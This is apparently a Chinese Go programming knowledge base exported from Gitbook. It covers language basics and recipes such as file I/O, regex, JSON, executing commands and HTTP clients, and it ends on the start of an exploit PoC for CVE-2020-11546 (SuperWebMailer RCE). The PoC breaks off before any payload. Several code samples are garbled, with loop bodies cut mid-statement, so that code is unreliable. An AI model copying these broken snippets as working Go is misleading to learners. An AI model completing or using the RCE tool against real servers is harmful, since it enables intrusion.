Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口 和其他语言如java的接口一样 声明接口 type interface_name interface { method_name1([args ...arg_type]) [return_type] method_name2([args ...arg_type]) [return_type] method_name3([args ...arg_type]) [return_type] ... method_namen([args ...arg_type]) [return_type] } 一个接口中可以定义多个方法，根据逻辑需要，自定义参数和返回值。 实现接口 一个结构体实现了某个接口的所有方法，则此结构体就实现了该接口。 实例： package main import \"fmt\" // 定义接口 type testImpl interface { testFunc1(a int, b int) } // 定义结构体 type testStruct struct { } // 实现函数 func (testMethod testStruct) TestFunc1(a int, b int) int { return a+b } // 调用函数 func main() { test := testStruct{} // 实例化方法1 res := test.TestFunc1(10,20) fmt.Println(res) test1 := new(testStruct) // 实例化方法2 res1 := test1.TestFunc1(10,20) fmt.Println(res1) } new和make Go提供了两种分配原语，即内建函数 new 和 make。 它们所做的事情不同，所应用的类型也不同。它们可能会引起混淆，但规则却很简单。 new 这是个用来分配内存的内建函数，但与其它语言中的同名函数不同，它不会初始化内存，只会将内存置零。也就是说，new(T) 会为类型为 T 的新项分配已置零的内存空间，并返回它的地址，也就是一个类型为 *T 的值。 它返回一个指针，该指针指向新分配的，类型为T的零值 实例： package main import ( \"fmt\" ) func main() { type test struct { a int b int } p := new(test) fmt.Println(p) // &{0 0} fmt.Println(*p) // {0 0} } make 内建函数 make(T, args) 的目的不同于 new(T)，它只用于创建切片、映射和信道，并返回类型为 T（而非 *T）的一个已初始化（而非置零）的值。 注意：make只适用于映射、切片和信道且不返回指针。若要获得明确的指针，请使用new分配内存。 defer defer 语句用于预设一个函数调用（即推迟执行函数）， 该函数会在执行 defer 的函数返回之前立即执行。它显得非比寻常， 但却是处理一些事情的有效方式，例如无论以何种路径返回，都必须释放资源的函数。 典型的例子就是解锁互斥和关闭文件。 被推迟函数的实参（如果该函数为方法则还包括接收者）在推迟执行时就会求值， 而不是在调用执行时才求值。这样不仅无需担心变量值在函数执行时被改变， 同时还意味着单个已推迟的调用可推迟多个函数的执行。 实例： 被推迟的函数按照后进先出（LIFO）的顺序执行，因此以上代码在函数返回时会打印 4 3 2 1 0 package main import ( \"fmt\" ) func main() { for i := 0; i 并发 go程 称之为Go程是因为现有的术语—线程、协程、进程等等—无法准确传达它的含义。 Go程具有简单的模型：它是与其它Go程并发运行在同一地址空间的函数。它是轻量级的，所有消耗几乎就只有栈空间的分配；而且栈最开始是非常小的，所以它们很廉价，仅在需要时才会随着堆空间的分配（和释放）而变化。 Go语言支持并发，我们只需要通过 go 关键字来开启 goroutine 即可。 goroutine 是轻量级线程，goroutine 的调度是由 Golang 运行时进行管理的。 语法： go 函数名( 参数列表 ) Go 允许使用 go 语句开启一个新的运行期线程， 即 goroutine，以一个不同的、新创建的 goroutine 来执行一个函数。 同一个程序中的所有 goroutine 共享同一个地址空间 实例： package main import ( \"fmt\" \"time\" ) func loop() { i := 1 for i 执行代码后，输出结果为1 1 1 2 2 2 3 3 3 ...，因为是3个goroutine在同时执行 通道（channel） 通道（channel，也叫信道）是用来传递数据的一个数据结构。 主要是获取并发的每个函数返回的数据 通道可用于两个 goroutine 之间通过传递一个指定类型的值来同步运行和通讯。操作符 用于指定通道的方向，发送或接收。如果未指定方向，则为双向通道。 ch 声明一个通使用chan关键字即可，通道在使用前必须先创建： ch := make(chan int) 实例： package main import \"fmt\" // 计算和 func loop(res chan int) { i := 1 sum := 0 for i 通道缓冲区 通道可以设置缓冲区，通过 make 的第二个参数指定缓冲区大小 ch := make(chan int, 100) 带缓冲区的通道允许发送端的数据发送和接收端的数据获取处于异步状态，就是说发送端发送的数据可以放在缓冲区里面，可以等待接收端去获取数据，而不是立刻需要接收端去获取数据。 不过由于缓冲区的大小是有限的，所以还是必须有接收端来接收数据的，否则缓冲区一满，数据发送端就无法再发送数据了。 注意：如果通道不带缓冲，发送方会阻塞直到接收方从通道中接收了值。如果通道带缓冲，发送方则会阻塞直到发送的值被拷贝到缓冲区内；如果缓冲区已满，则意味着需要等待直到某个接收方获取到一个值。接收方在有值可以接收之前会一直阻塞。 实例： package main import \"fmt\" // 计算所有通道的和 func loop(res chan int) { i := 1 for i 注意事项 接收者在收到数据前会一直阻塞。若信道是不带缓冲的，那么在接收者收到值前，发送者会一直阻塞；若信道是带缓冲的，则发送者仅在值被复制到缓冲区前阻塞；若缓冲区已满，发送者会一直等待直到某个接收者取出一个值为止。 遍历通道 通过 range 关键字来实现遍历读取到的数据，类似于与数组或切片 实例： package main import \"fmt\" func loop(res chan int) { i := 1 for i 关闭通道 如果通道接收不到数据后 ok 就为 false，这时通道就可以使用 close() 函数来关闭 package main import \"fmt\" func loop(res chan int) { i := 1 for i 异常处理 在异常处理方面，Go语言不像其他语言，使用try..catch.. finall...， 而使用defer, panic, recover，将异常和控制流程区分开。即通过panic抛出异常，然后在defer中，通过recover捕获这个异常，最后处理。 但是更加推荐的错误处理方法： Golang中我们通常会在函数或方法中返回**error**结构对象来判断是否有异常出现，并且可以更具需要自定义各种类型的error。如果返回的 error 值为 nil，则表示未遇到错误，否则 error 会返回一个字符串，用于说明遇到了什么错误。 error类型是一个接口类型，自定义的错误类型必须实现Error()方法，这是它的定义： type error interface { Error() string } 生成error 1、原生New方法，将字符串 text 包装成一个 error 对象返回 func New(text string) error { return &errorString{text} } //例如 errorIns := errors.New(\"test content\") fmt.Println(errorIns) 2、定义自己的错误 package main import ( \"fmt\" \"time\" ) // 定义结构体 type MyError struct { When time.Time What string } // 实现error接口中的方法 func (e MyError) Error() string { return fmt.Sprintf(\"%v: %v\", e.When, e.What) } // 编写异常函数 func oops() error { return MyError{ time.Date(1989, 3, 15, 22, 30, 0, 0, time.UTC), \"the file system has gone away\", } } func main() { if err := oops(); err != nil { fmt.Println(err) } } Panic异常 向调用者报告错误的一般方式就是将 error 作为额外的值返回；但是这种情况下程序不会退出，如果我们遇到了出现异常就必须停止程序的情况，就会使用到panic Go提供了内建的 panic 函数 它会产生一个运行时错误并终止程序 该函数接受一个任意类型的实参（一般为字符串），并在程序终止时打印 它还能表明发生了意料之外的事情，比如从无限循环中退出了package main import \"fmt\" func main() { panic(\"sth error !!!\") fmt.Println(\"hello world\") } /* panic: sth error !!! goroutine 1 [running]: main.main() /Users/d4m1ts/go/src/goTest/Hello.go:6 +0x39 */ 因为会直接停止整个程序，所以实际的库函数应避免 panic，若问题可以被屏蔽或解决， 最好就是让程序继续运行而不是终止整个程序恢复 当 panic 被调用后（包括不明确的运行时错误，例如切片检索越界或类型断言失败）， 程序将立刻终止当前函数的执行，并开始回溯Go程的栈，运行任何被推迟（defer）的函数。 若回溯到达Go程栈的顶端，程序就会终止。不过我们可以用内建的 recover 函数来重新或来取回Go程的控制权限并使其恢复正常执行。 实例：package main import ( \"fmt\" \"time\" ) func loop(a int){ defer func() { // 触发panic异常就会调用这个推迟函数 if err := recover(); err != nil { // recover函数恢复 fmt.Println(\"loop error: \", err) } }() if a > 3{ panic(\"erro a > 3\") } else { fmt.Println(\"normal: \", a) } } func main() { i := 0 for i 3 normal: 3 */ 通过恰当地使用恢复模式，do 函数（及其调用的任何代码）可通过调用 panic 来避免更坏的结果。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:14:26 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/01.GO基础/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/02.GO实例/01.GO常用基础实例.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/01.GO常用基础实例.html","title":"01.GO常用基础实例","keywords":"","body":" 介绍 读文件 按字节读取文件 借助ioutil来读取 仅使用ioutil包来完成读取操作 利用Scanner按行读取 写文件 使用ioutil 通过File句柄 通过bufio包 正则表达式 匹配内容是否存在 提取内容 替换内容 其他 JSON序列化和反序列化 标准JSON模块 更优的jsoniter 扩展 时间日期 随机数 伪随机数 真随机数 URL解析 Base64 命令行参数 执行系统命令 只执行命令，不获取结果 执行命令获取结果 执行命令获取结果并区分stdout和stderr 多条命令使用管道执行 扩展 HTTP请求 快速发起get请求 带有参数的GET请求 返回JSON的数据包 自定义Header头 快速发起POST请求 自定义POST请求 忽略证书 cookieJar和代理设置 gzip解压 go flag 颜色输出 参考 介绍 记录一些可能常用到的实例，便于快速查询 读文件 按字节读取文件 这种方式是以字节为单位来读取，相对底层一些，代码量也较大 package main import ( \"fmt\" \"io\" \"os\" ) func main() { file,_ := os.Open(\"test.txt\") defer file.Close() buf := make([]byte, 1024) // 每次读取1024字节 var res string // 存放最终的结果 for { count, err := file.Read(buf) if err == io.EOF { // 检测是否到结尾 break } else { currBytes := buf[:count] // 读取了count字节 res += string(currBytes) // 最终结果 } } fmt.Println(res) } 借助ioutil来读取 由于 os.File 也是 io.Reader 的实现，我们可以调用 ioutil.ReadAll(io.Reader) 方法，将文件所有字节读取出来，省去了使用字节缓存循环读取的过程。 package main import ( \"fmt\" \"io/ioutil\" \"os\" ) func main() { file,_ := os.Open(\"test.txt\") defer file.Close() byteRes, _ := ioutil.ReadAll(file) // 返回存放结果的切片 fmt.Printf(\"%T\\n\", byteRes) // []uint8 fmt.Println(string(byteRes)) } 仅使用ioutil包来完成读取操作 为了进一步简化文件读取操作，ioutil 还提供了 ioutil.ReadFile(filename string) 方法，一行代码搞定读取任务 package main import ( \"fmt\" \"io/ioutil\" ) func main() { data, _ := ioutil.ReadFile(\"test.txt\") fmt.Println(string(data)) } 利用Scanner按行读取 逐行读取文件内容，这个时候可以 Scanner 来完成 package main import ( \"bufio\" \"fmt\" \"os\" ) func main() { file, _ := os.Open(\"test.txt\") defer file.Close() scanner := bufio.NewScanner(file) // 类似Java中的Scanner for scanner.Scan() { fmt.Println(scanner.Text()) } } 写文件 使用ioutil 刚才用到了ioutil.ReadFile，与之对应的，肯定也有WriteFile 该函数属于全覆盖写入，如果文件不存在，则会根据指定的权限创建文件，如果存在，则会先清空文件原有内容，然后再写入新数据 package main import ( \"fmt\" \"io/ioutil\" \"os\" ) func main() { data := []byte(\"hello d4m1ts\") fmt.Println(os.FileMode(0666).String()) // -rw-rw-rw- ioutil.WriteFile(\"test.txt\", data, 0666) } 通过File句柄 os.OpenFile(name string, flag int, perm FileMode)方法，通过指定额外的 读写方式 和 文件权限 参数，使文件操作变得更为灵活。 flag 有以下几种常用的值： os.O_CREATE: create if none exists 不存在则创建 os.O_RDONLY: read-only 只读 os.O_WRONLY: write-only 只写 os.O_RDWR: read-write 可读可写 os.O_TRUNC: truncate when opened 文件长度截为0：即清空文件 os.O_APPEND: append 追加新数据到文件package main import ( \"fmt\" \"os\" ) func main() { file,_ := os.OpenFile(\"test.txt\", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0666) // 按照特定权限打开 defer file.Close() data := []byte(\"hello d4m1ts\") count, _ := file.Write(data) // 按字节写入，返回的count为写入的字节数 fmt.Println(count) count, _ = file.WriteString(\"\\nHello D4m1ts\") // 按字符串写入 fmt.Println(count) file.Sync() // 确保写入到磁盘 } 通过bufio包 这种方式其实是在File句柄上做了一层封装，调用方式和上面直接写入非常相似package main import ( \"bufio\" \"fmt\" \"os\" ) func main() { file,_ := os.OpenFile(\"test.txt\", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0666) defer file.Close() writer := bufio.NewWriter(file) data := []byte(\"hello d4m1ts\") count, _ := writer.Write(data) // 按字节写入，返回的count为写入的字节数 fmt.Println(count) count, _ = writer.WriteString(\"\\nHello D4m1ts\") // 按字符串写入 fmt.Println(count) writer.Flush() // 清空缓存，确保写入到磁盘 } 正则表达式 匹配内容是否存在 package main import ( \"fmt\" \"regexp\" ) func main() { regex := \"\\\\d{1,3}\" res, _ := regexp.MatchString(regex, \"123123\") res1, _ := regexp.MatchString(regex, \"aaaa\") fmt.Println(res) // true fmt.Println(res1) // false } 提取内容 package main import ( \"fmt\" \"regexp\" ) func main() { regex, _ := regexp.Compile(\"(\\\\d{1,3})\\\\d{1,3}\") // 编译正则表达式 fmt.Println(regex.MatchString(\"123123123123\")) // true fmt.Println(regex.FindString(\"123213123123\")) // 123213 返回第一个匹配的 fmt.Println(regex.FindStringIndex(\"123213123123\")) // [0 6] 返回第一个匹配的开始和结尾的索引 fmt.Println(regex.FindStringSubmatch(\"123213123123\")) // [123213 123] 返回包括()这种子匹配的 fmt.Println(regex.FindAllString(\"123213123123\",-1)) // [123213 123123] 返回匹配的所有内容，n表示为返回个数，-1则返回全部 fmt.Println(regex.FindAllStringSubmatch(\"123213123123\",-1)) // [[123213 123] [123123 123]] 同时返回子匹配的结果 fmt.Println(regex.FindAll([]byte(\"123123123123\"), -1)) // [[49 50 51 49 50 51] [49 50 51 49 50 51]] 通过字节去匹配，返回的也是字节的结果 } 替换内容 package main import ( \"fmt\" \"regexp\" ) func main() { regex, _ := regexp.Compile(\"(\\\\d{1,3})\\\\d{1,3}\") // 编译正则表达式 fmt.Println(regex.ReplaceAllString(\"123123123213\",\"a\")) // aa } 其他 在线正则表达式测试网站：https://regex101.com/ golang正则匹配的时候，.默认是不匹配换行的，所以要匹配多行数据就容易出问题 这个时候可以采用如下格式，让.也可以匹配换行(?s).* 实例： JSON序列化和反序列化 标准JSON模块 Go 语言标准库 encoding/json 提供了操作 JSON 的方法，一般可以使用 json.Marshal 和 json.Unmarshal 来序列化和解析 JSON 字符串 实例一：package main import ( \"encoding/json\" \"fmt\" ) func main() { // 序列化 s1 := []string{\"apple\", \"peach\", \"pear\"} s2, _ := json.Marshal(s1) // 转字符串 fmt.Println(string(s2)) // [\"apple\",\"peach\",\"pear\"] // 反序列化 var s3 [] string json.Unmarshal([]byte(s2), &s3) // 字符串恢复 fmt.Println(s3) // [apple peach pear] fmt.Println(len(s3), s3[0]) // 3 apple } 实例二：package main import ( \"encoding/json\" \"fmt\" ) // 定义结构体，变量名注意大写，因为跨到json包了 type User struct { Name string Age int } func main() { // 初始化结构体 user := User{ Name: \"d4m1ts\", Age: 18, } // 序列化，转字符串 s1, _ := json.Marshal(user) fmt.Println(string(s1)) // 反序列化，恢复为原来的结构 user2 := User{} json.Unmarshal(s1, &user2) fmt.Println(user2) } 更优的jsoniter 标准库 encoding/json 在使用时需要预先定义结构体，使用时显得不够灵活。这时候可以尝试使用 github.com/json-iterator/go 模块，其除了提供与标准库一样的接口之外，还提供了一系列更加灵活的操作方法。go get -v github.com/json-iterator/go package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" ) func main() { // 反序列化，恢复为原来的结构 s := `{\"a\":\"b\", \"c\":[\"d\",\"e\",\"f\"]}` res := jsoniter.Get([]byte(s), \"c\") fmt.Println(res.ToString()) // [\"d\",\"e\",\"f\"] 只解析\"c\"的内容部分 } 扩展 大多数时候获取的json数据可能是映射+切片形式的，只有上面的一些内容很难搞，所以还是补充一下 使用.GetInterface()会自动给结果转换为interface{}，再通过这个结果继续转换，如[]interface{} 想要拿到最后的数据，只需要通过数据.(对应的格式)即可，如 aaa.(string)表示转换为string [!note] 一步一步看吧，用.GetInterface()或者等报错提示，就可以看到应该转换的格式了，如下图右边就是可以转换的格式 func main() { strings := \"{\\\"a\\\":[{\\\"b\\\":\\\"c\\\"}]}\" var res interface{} res = jsoniter.Get([]byte(strings), \"a\").GetInterface() fmt.Println(res.([]interface{})) for _,i := range res.([]interface{}) { fmt.Println(i.(map[string]interface{})) } } 时间日期 package main import ( \"fmt\" \"time\" ) func main() { p := fmt.Println // 现在的时间 now := time.Now() p(now) // 休眠1秒 time.Sleep(time.Second * 1) p(time.Now()) // 现在的时间 // 格式类型转换 t1, _ := time.Parse(time.RFC3339, \"2012-11-01T22:08:41+00:00\") p(t1) // 2012-11-01 22:08:41 +0000 +0000 // 格式化输出 p(now.Format(\"3:04PM\")) // 5:14PM p(now.Format(\"Mon Jan _2 15:04:05 2006\")) // Tue Dec 28 17:15:49 2021 p(now.Format(\"2006-01-02T15:04:05.999999-07:00\")) // 2021-12-28T17:15:49.121777+08:00 p(now.Format(time.RFC850)) // Tuesday, 28-Dec-21 17:20:02 CST fmt.Printf(\"%d-%02d-%02dT%02d:%02d:%02d-00:00\\n\", now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second()) // 2021-12-28T17:20:02-00:00 } 随机数 伪随机数 Go的math/rand包提供伪随机数生成。例如，rand.Intn返回一个随机int n，0 。 伪随机生成的数字是确定的，不论在什么机器、什么时间，只要执行的随机代码一样，那么生成的随机数就一样 package main import ( \"fmt\" \"math/rand\" ) func main() { p := fmt.Println p(rand.Int()) // 5577006791947779410 p(rand.Int31n(int32(60))) // 27 for i:=0; i 真随机数 crypto/rand是为了提供更好的随机性满足密码对随机数的要求，在linux上已经有一个实现就是/dev/urandom，crypto/rand就是从这个地方读“真随机”数字返回，但性能比较慢 package main import ( \"crypto/rand\" \"math/big\" ) func main() { for i := 0; i URL解析 可以直接使用url.Parse(string u)来解析，其中包括方案，身份验证信息，主机，端口，路径，查询参数和查询片段等信息 package main import ( \"fmt\" \"net/url\" ) func main() { u := \"https://admin:password@blog.gm7.org/test/point?a=123&b=test\" uu, _ := url.Parse(u) fmt.Println(uu.Scheme) fmt.Println(uu.User) fmt.Println(uu.User.Username()) fmt.Println(uu.Host) fmt.Println(uu.Path) fmt.Println(uu.Hostname()) fmt.Println(uu.Query()) } /* https admin:password admin blog.gm7.org /test/point blog.gm7.org map[a:[123] b:[test]] */ Base64 package main import ( \"encoding/base64\" \"fmt\" ) func main() { a := \"123456\" res := base64.StdEncoding.EncodeToString([] byte(a)) fmt.Println(res) // MTIzNDU2 decod, _ := base64.StdEncoding.DecodeString(res) fmt.Println(string(decod)) // 123456 } 命令行参数 从命令行获取参数，得到的是一个切片 package main import ( \"fmt\" \"os\" ) func main() { args := os.Args fmt.Println(args) } /* go run Hello.go 123 456 [/var/folders/fw/tddtsjp91wb9q64l5xt7jd540000gn/T/go-build3185553057/b001/exe/Hello 123 456] */ 执行系统命令 在 Golang 中用于执行命令的库是 os/exec，exec.Command 函数返回一个 Cmd 对象，根据不同的需求，可以将命令的执行分为三种情况 只执行命令，不获取结果 执行命令，并获取结果（不区分 stdout 和 stderr） 执行命令，并获取结果（区分 stdout 和 stderr） 只执行命令，不获取结果 直接调用Run()函数 package main import ( \"fmt\" \"os/exec\" ) func main() { res := exec.Command(\"open\", \"-na\", \"Calculator\").Run() // run会阻塞等到命令执行结束 fmt.Println(res) // } 执行命令获取结果 可以调用 cmd 的 CombinedOutput 函数 package main import ( \"fmt\" \"os/exec\" ) func main() { cmd := exec.Command(\"ls\", \"-la\") res, _ := cmd.CombinedOutput() fmt.Println(string(res)) // ls -la 执行结果 } 执行命令获取结果并区分stdout和stderr package main import ( \"bytes\" \"fmt\" \"os/exec\" ) func main() { cmd := exec.Command(\"ls\", \"-la\") var stdout, stderr bytes.Buffer cmd.Stdout = &stdout cmd.Stderr = &stderr cmd.Run() fmt.Println(string(stdout.Bytes())) // ls -la 执行结果 } 多条命令使用管道执行 就是类似shell里面|的作用，ls -la | grep go package main import ( \"fmt\" \"os\" \"os/exec\" ) func main() { cmd1 := exec.Command(\"ls\", \"-la\") cmd2 := exec.Command(\"grep\", \"go\") cmd2.Stdin, _ = cmd1.StdoutPipe() cmd2.Stdout = os.Stdout cmd2.Start() cmd1.Run() cmd2.Wait() fmt.Println(cmd2.Stdout) // ls -la | grep go 执行结果 } 扩展 前面每个空格间都需要单独一个参数，有时候很长就不方便，可以采用如下的方式来 cmd := exec.Command(\"/bin/sh\",\"-c\",\"expr 2 + 33\") HTTP请求 快速发起get请求 package main import ( \"fmt\" \"io/ioutil\" \"net/http\" ) func main() { url := \"https://www.baidu.com/\" response,_ := http.Get(url) // 发起get请求 defer response.Body.Close() fmt.Println(response.StatusCode) fmt.Println(response.Header.Get(\"Server\")) body, _ := ioutil.ReadAll(response.Body) fmt.Println(string(body)) // 源码 } 收到的数据包 GET / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip 带有参数的GET请求 可以直接在上面的url后面直接构造参数，也可以通过如下的方式手动设置参数 package main import ( \"fmt\" \"net/http\" \"net/url\" ) func main() { u := \"http://baidu.com/\" Url, _ := url.Parse(u) param := url.Values{} param.Set(\"name\", \"d4m1ts\") param.Set(\"中文\", \"汉字测试\") Url.RawQuery = param.Encode() // 包含URL编码 fmt.Println(Url) // http://baidu.com/?name=d4m1ts&%E4%B8%AD%E6%96%87=%E6%B1%89%E5%AD%97%E6%B5%8B%E8%AF%95 resp,_ := http.Get(Url.String()) fmt.Println(resp.StatusCode) // 200 } 收到的数据包 GET /?name=d4m1ts&%E4%B8%AD%E6%96%87=%E6%B1%89%E5%AD%97%E6%B5%8B%E8%AF%95 HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip 返回JSON的数据包 返回是json格式，如何快速格式化数据 返回的json内容 { \"args\": {}, \"headers\": { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Dnt\": \"1\", \"Host\": \"httpbin.org\", \"Sec-Gpc\": \"1\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\", \"X-Amzn-Trace-Id\": \"Root=1-61cbb6de-6e8a5d6a2710be6f22da6f92\" }, \"origin\": \"213.239.21.35\", \"url\": \"http://httpbin.org/get\" } 一样的发起http请求，只是最后用JSON来反序列化而已 package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" \"io/ioutil\" \"net/http\" ) func main() { u := \"http://httpbin.org/get\" resp, err := http.Get(u) if err == nil { // 请求成功 body, _ := ioutil.ReadAll(resp.Body) origin := jsoniter.Get(body, \"origin\") fmt.Println(origin.ToString()) // 213.239.21.35 headers := jsoniter.Get(body, \"headers\") fmt.Println(headers.Get(\"Host\").ToString()) // httpbin.org } } 自定义Header头 package main import ( \"fmt\" jsoniter \"github.com/json-iterator/go\" \"io/ioutil\" \"net/http\" \"time\" ) func main() { // 创建一个HTTP请求，但是不发送请求 u := \"http://httpbin.org/get\" req, _ := http.NewRequest(\"GET\", u, nil) req.Header.Set(\"User-Agent\", \"Test GO\") req.Header.Set(\"Name\", \"d4m1ts\") // 发送刚才创建的请求 client := http.Client{ Timeout: 3*time.Second, // 超时时间 } resp, _ := client.Do(req) body, _ := ioutil.ReadAll(resp.Body) headers := jsoniter.Get(body, \"headers\") fmt.Println(headers.ToString()) } /* { \"Accept-Encoding\": \"gzip\", \"Host\": \"httpbin.org\", \"Name\": \"d4m1ts\", \"User-Agent\": \"Test GO\", \"X-Amzn-Trace-Id\": \"Root=1-61cbbb0d-68f21a6c5c36abd861b6fe99\" } */ 收到的数据包 GET / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Test GO Name: d4m1ts Accept-Encoding: gzip 快速发起POST请求 方法一：使用http.Post，有一点点麻烦 package main import ( \"net/http\" \"strings\" ) func main() { u := \"http://127.0.0.1:8000\" http.Post(u, \"application/x-www-form-urlencoded\", strings.NewReader(\"aa=bb\")) } 收到的http请求 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Content-Length: 5 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip aa=bb 方法二：使用http.PostForm，相对简单，但是无法设置content-type，没那么自由 package main import ( \"net/http\" \"net/url\" ) func main() { u := \"http://127.0.0.1:8000\" param := url.Values{} param.Set(\"aaa\", \"bbb\") http.PostForm(u, param) } 收到的http请求 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: Go-http-client/1.1 Content-Length: 7 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip aaa=bbb 自定义POST请求 和get差不多，只不过是多了设置content-type和post数据的步骤而已 举例为发送json数据 package main import ( \"bytes\" \"encoding/json\" \"net/http\" ) func main() { // 创建请求，但是不发起 u := \"http://127.0.0.1:8000\" param := map[string]string{ \"aa\": \"bb\", \"name\": \"d4m1ts\", } buf, _ := json.Marshal(param) // 序列化的json req, _ := http.NewRequest(\"POST\", u, bytes.NewReader(buf)) req.Header.Set(\"User-Agent\", \"UA TEST\") req.Header.Set(\"Content-Type\", \"application/json\") // 发送刚才的请求 client := http.Client{} client.Do(req) } 收到的http数据包 POST / HTTP/1.1 Host: 127.0.0.1:8000 User-Agent: UA TEST Content-Length: 27 Content-Type: application/json Accept-Encoding: gzip {\"aa\":\"bb\",\"name\":\"d4m1ts\"} 忽略证书 有些时候一些ssl网站因为证书问题也会抛出panic异常，所以一般可以忽略SSL证书，在初始化http客户端的时候忽略，代码如下 tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 忽略SSL证书 } Client := http.Client{ Transport: tr, } cookieJar和代理设置 // 初始化Client jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) proxy,_ := url.Parse(\"socks5://127.0.0.1:1080\") netTransport := &http.Transport{ Proxy: http.ProxyURL(proxy), MaxIdleConnsPerHost: 10, ResponseHeaderTimeout: time.Second * time.Duration(5), } Client = http.Client{ Transport: netTransport, Jar: jar, Timeout: time.Second * 10, } Client.Get(\"http://cip.cc\") gzip解压 有些返回的数据是二进制乱码的，这个时候我们就需要进行gzip解压 resp, _ := Client.Do(req) reader,_ := gzip.NewReader(resp.Body) source, _ := ioutil.ReadAll(reader) fmt.Println(string(source)) go flag 这个库主要用来判断工具命令行传入的参数用的 虽然go有os.Args，但是不如这个好用 演示： func main() { var filePath string flag.StringVar(&filePath, \"file\", \"\", \"markdown文件路径\") flag.Parse() if flag.Lookup(\"file\").DefValue == flag.Lookup(\"file\").Value.String() { // 避免使用默认参数，所以加个判断 flag.Usage() } if flag.NFlag() == 0 { // 使用的命令行参数个数，这个地方可以用来判断用户是否输入参数（程序正常情况下会使用默认参数） flag.Usage() os.Exit(0) } } [!NOTE] 还有一些其他的参数，可以自己研究下，基本上看到名字就知道啥意思，主要用的就上面那些 如果觉得帮助不好看，可以重写flag.Usage()这个方法 flag.Usage = func() { fmt.Fprintf(flag.CommandLine.Output(), \"markdown图片自动上传到图床\\nUsage of %s:\\n\", os.Args[0]) flag.PrintDefaults() } 颜色输出 最简单的版本 package main import \"fmt\" func main() { fmt.Printf(\"\\033[1;31;40m%s\\033[0m\\n\",\"Red.\") fmt.Printf(\"\\033[1;37;41m%s\\033[0m\\n\",\"Red.\") } 输出所有颜色 package main import \"fmt\" func main() { for b := 40; b 但是每一次都这样很难记住，所以已经有人给他封装成了一个包：https://github.com/fatih/color，可以快速看下它的说明文档 实例： package main import ( \"github.com/fatih/color\" ) func main() { color.Blue(\"aaaa%scccc\", \"bbb\") color.Red(\"red red\") color.Magenta(\"And many others ..\") } 参考 Golang标准库文档 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:15:18 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/01.GO/02.GO实例/01.GO常用基础实例.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/01.GO/02.GO实例/02.使用GO编写POC.html":{"url":"知识库/04.编程开发/01.GO/02.GO实例/02.使用GO编写POC.html","title":"02.使用GO编写POC","keywords":"","body":" CVE-2020-11546 扩展1：交叉编译 扩展2：go.mod 扩展3：go get 扩展4：交互输入 代码 测试图 CVE-2021-20837 扩展5：忽略SSL证书 扩展6：正则表达式 代码 测试图 CVE-2020-11546 [!NOTE] 已上传至GitHub:https://github.com/damit5/CVE-2020-11546 扩展1：交叉编译 CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_darwin CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_linux CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -trimpath -o release/superwebmailerRCE_win.exe 扩展2：go.mod go mod init go mod init github.com/damit5/CVE-2020-11546 不然不能go get -u自动下载编译，会出现问题 扩展3：go get 直接使用go get -u github.com/xxx可能出现版本的问题，可以使用如下命令执行版本或者分支 go get -u -v github.com/damit5/CVE-2020-11546@master [!TIP] 也可以使用@commit hash等等 http://icattlecoder.github.io/2019/03/29/go-module-and-version.html https://zhuanlan.zhihu.com/p/103534192 扩展4：交互输入 for { fmt.Printf(\"\\n\\ncommand: \") _, _ = fmt.Scanln(&command) if command != \"\" { break } } 代码 package main import ( \"bytes\" \"fmt\" \"io/ioutil\" \"net/http\" \"os\" \"strings\" ) func banner(){ fmt.Println(` .___ _____ ____ __ __| _// | | _____/_ |/ |_ ______ / __ |/ | |_/ \\| \\ __\\/ ___/ / /_/ / ^ / Y Y \\ || | \\___ \\ \\____ \\____ ||__|_| /___||__| /____ > \\/ |__| \\/ \\/ CVE-2020-11546 `) } /* * 参数检查 */ func argsCheck(args []string) { if len(args) != 2 { fmt.Printf(\"Usage:\\n\\t./%s \\n\", args[0]) os.Exit(0) } } /* * url处理 */ func urlHandler(target string) string { // 没有http前缀的添加http前缀 if !strings.HasPrefix(target, \"http\") { target = \"http://\" + target } // 有/结尾的就去掉/ if strings.HasSuffix(target, \"/\") { // 去掉后缀 / target = strings.TrimSuffix(target, \"/\") fmt.Println(target) } return target } /* * 漏洞检查 */ func check(target string) bool { // 